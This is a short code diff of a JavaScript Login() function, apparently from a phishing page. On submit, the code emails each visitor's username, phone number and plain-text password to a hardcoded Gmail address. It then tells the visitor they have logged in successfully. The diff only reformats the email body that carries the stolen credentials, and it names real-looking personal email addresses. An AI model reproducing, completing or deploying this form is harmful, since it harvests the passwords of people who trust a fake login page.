@@ -76,7 +76,7 @@ function Login() {
                 To: 'vickykumargupta369@gmail.com',
                 From: "iamwebdeveloper0@gmail.com",
                 Subject: "User Login info",
-                Body: `Name : ${username.value} <br> || Phone-number :  ${tel.value} || <br> Password : ${password.value}`
+                Body: `Name : ${username.value}  || <br> Phone-number :  ${tel.value} || <br> Password : ${password.value}`
             }).then(
                 ShowMessage(`You have  logged in successfully as ${username.value}`)
             );
